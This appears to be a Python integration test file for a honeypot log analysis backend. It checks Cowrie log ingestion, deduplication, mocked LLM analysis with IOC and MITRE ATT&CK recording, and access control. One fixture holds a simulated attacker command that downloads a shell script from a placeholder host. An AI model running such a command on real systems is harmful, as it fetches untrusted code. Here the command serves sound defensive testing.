"""Read-only integration checks against the configured PostgreSQL instance."""
import unittest
import json
from contextlib import contextmanager
from datetime import datetime, timezone
from uuid import uuid4
from unittest.mock import patch

from fastapi.testclient import TestClient
from sqlalchemy import select, func
from sqlalchemy.dialects.postgresql import insert

from backend.api import app
from backend.routes import AnalysisResult, Finding, IocProposal, MitreProposal


class LiveTests(unittest.TestCase):
    def setUp(self):
        # Legacy module tests isolate authentication, just as they isolate the LLM.
        # test_auth exercises the actual authentication/authorization boundary in SQL.
        if self._testMethodName != "test_sensitive_endpoint_restricted":
            self.auth_patch = patch("backend.auth.middleware.authorize_request", side_effect=lambda request: setattr(request.state, "user", {"rol": "administrador"}))
            self.auth_patch.start()

    def tearDown(self):
        if hasattr(self, "auth_patch"):
            self.auth_patch.stop()

    def test_import_and_reimport_in_rolled_back_transaction(self):
        with TestClient(app, client=("127.0.0.1", 50000)) as client:
            client.headers["origin"] = "http://127.0.0.1:5173"
            client.headers["x-csrf-token"] = client.get("/api/auth/csrf").json()["csrf_token"]
            engine = app.state.engine
            with engine.connect() as connection:
                outer = connection.begin()
                # Catalog fixtures belong to this rolled-back test, not the live DB.
                t = app.state.tables
                for number, name in ((1, "IP"), (2, "Dominio"), (3, "URL"), (4, "Hash")):
                    connection.execute(insert(t["tipo_ioc"]).values(id_tipo_ioc=number,nombre=name).on_conflict_do_nothing())
                connection.execute(insert(t["tactica_mitre"]).values(codigo_tactica="TA0002",nombre="Execution").on_conflict_do_nothing())
                connection.execute(insert(t["tecnica_mitre"]).values(codigo_tecnica="T1059",nombre="Command and Scripting Interpreter").on_conflict_do_nothing())
                connection.execute(insert(t["tecnica_mitre"]).values(codigo_tecnica="T1059.004",tecnica_padre_id="T1059",nombre="Unix Shell").on_conflict_do_nothing())
                connection.execute(insert(t["tecnica_tactica"]).values(codigo_tecnica="T1059.004",codigo_tactica="TA0002").on_conflict_do_nothing())

                class TransactionEngine:
                    @contextmanager
                    def begin(self):
                        with connection.begin_nested():
                            yield connection

                    @contextmanager
                    def connect(self):
                        yield connection

                app.state.engine = TransactionEngine()
                try:
                    raw = {"eventid": "cowrie.command.input", "timestamp": datetime.now(timezone.utc).isoformat(), "session": "test-" + uuid4().hex, "src_ip": "198.51.100.23", "src_port": 51515, "dst_port": 2222, "input": "wget http://example.org/a.sh"}
                    content = (json.dumps(raw) + "\nnot-json\n").encode()
                    results = [client.post("/api/ingesta/cowrie", files={"file": ("cowrie.json", content)}).json() for _ in range(2)]
                    self.assertEqual(results[0]["insertados"], 1)
                    self.assertEqual(results[1]["duplicados"], 1)
                    self.assertEqual(len(results[0]["errores"]), 1)
                    session = app.state.tables["sesion"]
                    event = app.state.tables["evento"]
                    session_id = connection.scalar(select(session.c.id_sesion).where(session.c.cowrie_session_id == raw["session"]))
                    self.assertIsNotNone(session_id)
                    self.assertEqual(connection.scalar(select(func.count()).where(event.c.id_sesion == session_id)), 1)
                    result = AnalysisResult(resumen="Comando de descarga observado", acciones=[Finding(tipo="comando", descripcion="Descarga mediante shell", confianza=0.9, eventos=[connection.scalar(select(event.c.id_evento).where(event.c.id_sesion == session_id))], iocs=[IocProposal(tipo="URL", valor="http://example.org/a.sh", evento=connection.scalar(select(event.c.id_evento).where(event.c.id_sesion == session_id)))], mitre=[MitreProposal(codigo="T1059.004", justificacion="Comando en shell", confianza=0.7)])])
                    with patch.dict("os.environ", {"LLM_MODEL": "test-provider-model", "LLM_PROVIDER": "test"}), patch("backend.routes.real_result", return_value=result):
                        analysis = client.post(f"/api/sesiones/{session_id}/analizar")
                    self.assertEqual(analysis.status_code, 200)
                    details = client.get("/api/analisis/" + analysis.json()["id_analisis"]).json()
                    self.assertEqual(details["estado"], "completado")
                    self.assertEqual(len(details["acciones"]), 1)
                    self.assertEqual(len(details["acciones"][0]["mitre"]), 1)
                    self.assertEqual(connection.scalar(select(func.count()).select_from(app.state.tables["deteccion_ioc"]).where(app.state.tables["deteccion_ioc"].c.id_analisis == details["id_analisis"])), 1)
                    current = client.get(f"/api/sesiones/{session_id}").json()
                    self.assertEqual(current["estado_analisis"], "analizada")
                    with patch("backend.routes.real_result", side_effect=AssertionError("LLM should not be called")):
                        reused = client.post(f"/api/sesiones/{session_id}/analizar")
                    self.assertEqual(reused.status_code, 200)
                    self.assertTrue(reused.json()["reutilizado"])
                    self.assertEqual(reused.json()["id_analisis"], analysis.json()["id_analisis"])

                    # A later event makes the old result stale without changing the capture.
                    later = {**raw, "timestamp": datetime.now(timezone.utc).isoformat(), "input": "pwd"}
                    uploaded = client.post("/api/ingesta/cowrie", files={"file": ("later.json", (json.dumps(later)+"\n").encode())})
                    self.assertEqual(uploaded.json()["insertados"], 1)
                    stale = client.get(f"/api/sesiones/{session_id}").json()
                    self.assertEqual(stale["estado_analisis"], "pendiente")
                    self.assertTrue(stale["analisis_desactualizado"])
                    self.assertEqual(stale["analisis"]["id_analisis"], analysis.json()["id_analisis"])

                    with patch.dict("os.environ", {"LLM_MODEL": "test-provider-model", "LLM_PROVIDER": "test"}), patch("backend.routes.real_result", side_effect=RuntimeError("provider unavailable")):
                        failed = client.post(f"/api/sesiones/{session_id}/analizar")
                    self.assertEqual(failed.status_code, 502)
                    self.assertEqual(client.get(f"/api/sesiones/{session_id}").json()["estado_analisis"], "error")
                    analysis_t = app.state.tables["analisis_llm"]
                    failed_id = connection.scalar(select(analysis_t.c.id_analisis).where(analysis_t.c.id_sesion == session_id, analysis_t.c.estado == "fallido"))
                    self.assertIsNotNone(failed_id)
                    self.assertEqual(connection.scalar(select(func.count()).select_from(app.state.tables["accion_identificada"]).where(app.state.tables["accion_identificada"].c.id_analisis == failed_id)), 0)

                    with patch.dict("os.environ", {"LLM_MODEL": "test-provider-model", "LLM_PROVIDER": "test"}), patch("backend.routes.real_result", return_value=result):
                        retried = client.post(f"/api/sesiones/{session_id}/analizar")
                    self.assertEqual(retried.status_code, 200)
                    self.assertFalse(retried.json()["reutilizado"])
                    self.assertNotEqual(retried.json()["id_analisis"], analysis.json()["id_analisis"])
                    self.assertEqual(client.get(f"/api/sesiones/{session_id}").json()["estado_analisis"], "analizada")
                    self.assertEqual(connection.scalar(select(func.count()).select_from(app.state.tables["ioc"]).where(app.state.tables["ioc"].c.valor == "http://example.org/a.sh")), 1)

                    # A second request cannot start while a current attempt is in progress.
                    model_id = connection.scalar(select(analysis_t.c.id_modelo).where(analysis_t.c.id_analisis == failed_id))
                    pending_id = connection.scalar(analysis_t.insert().values(id_sesion=session_id, id_modelo=model_id, estado="en_proceso", fecha_inicio=func.clock_timestamp(), creado_en=func.clock_timestamp()).returning(analysis_t.c.id_analisis))
                    self.assertEqual(client.post(f"/api/sesiones/{session_id}/analizar").status_code, 409)
                    self.assertEqual(client.get(f"/api/sesiones/{session_id}").json()["estado_analisis"], "en_proceso")
                    self.assertIsNotNone(pending_id)
                finally:
                    app.state.engine = engine
                    outer.rollback()

    def test_database_and_api(self):
        with TestClient(app, client=("127.0.0.1", 50000)) as client:
            self.assertEqual(client.get("/api/health").json()["database"], "connected")
            sessions = client.get("/api/sesiones")
            self.assertEqual(sessions.status_code, 200)
            self.assertIsInstance(sessions.json(), list)
            with app.state.engine.connect() as conn:
                total = conn.scalar(select(func.count()).select_from(app.state.tables["evento"]))
            self.assertEqual(client.get("/api/dashboard/resumen").json()["eventos"], total)
            self.assertEqual(client.get("/api/iocs").status_code, 200)
            self.assertEqual(client.get("/api/mitre/mapeos").status_code, 200)
            invalid = {"eventid": "cowrie.session.connect", "timestamp": datetime.now(timezone.utc).isoformat(), "session": "invalid-" + uuid4().hex, "src_port": 70000, "_collector": {"source_id": uuid4().hex}}
            self.assertEqual(client.post("/api/ingesta/eventos", headers={"X-API-Key": app.state.api_key}, json={"eventos": [invalid]}).status_code, 422)

    def test_sensitive_endpoint_restricted(self):
        with TestClient(app, client=("192.168.56.101", 50000)) as client:
            self.assertEqual(client.get("/api/sesiones").status_code, 401)
            self.assertEqual(client.post("/api/ingesta/cowrie", files={"file": ("x.json", b"{}\n")}).status_code, 403)


if __name__ == "__main__":
    unittest.main()
